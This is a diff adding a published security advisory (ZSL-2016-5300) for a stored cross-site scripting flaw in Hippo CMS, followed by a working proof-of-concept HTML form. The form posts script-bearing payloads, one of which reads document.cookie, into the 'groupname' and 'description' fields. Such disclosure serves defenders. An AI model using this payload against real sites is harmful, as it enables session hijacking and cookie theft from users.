@@ -1,0 +1,52 @@
+<!--
+
+Hippo CMS 10.1 Stored Cross-Site Scripting Vulnerability
+
+
+Vendor: Hippo B.V.
+Product web page: http://www.onehippo.org
+Affected version: 10.1, 7.9 and 7.8 (Enterprise Edition)
+
+Summary: Hippo CMS is an open source Java CMS. We
+built it so you can easily integrate it into your
+existing architecture.
+
+Desc: Hippo CMS suffers from a stored XSS vulnerability.
+Input passed thru the POST parameters 'groupname' and
+'description' is not sanitized allowing the attacker to
+execute HTML code into user's browser session on the
+affected site.
+
+
+Tested on: Linux 2.6.32-5-xen-amd64
+           Java/1.8.0_66
+           Apache-Coyote/1.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5300
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5300.php
+
+Vendor: http://www.onehippo.org/security-issues-list/security-12.html
+        http://www.onehippo.org/about/release-notes/10/10.1.2-release-notes.html
+
+
+04.12.2015
+
+-->
+
+
+<html>
+ <body>
+  <form action="https://10.0.2.17/?1-1.IBehaviorListener.0-root-tabs-panel~container-cards-6-panel-panel-form-create~button" method="POST">
+   <input type="hidden" name="id26c_hf_0" value="" />
+   <input type="hidden" name="groupname" value="<img src=ko onerror=confirm(document.cookie)>" />
+   <input type="hidden" name="description" value="<img src=ko onerror=confirm(2)>" />
+   <input type="hidden" name="create-button" value="1" />
+   <input type="submit" value="Inject code" />
+  </form>
+ </body>
+</html>
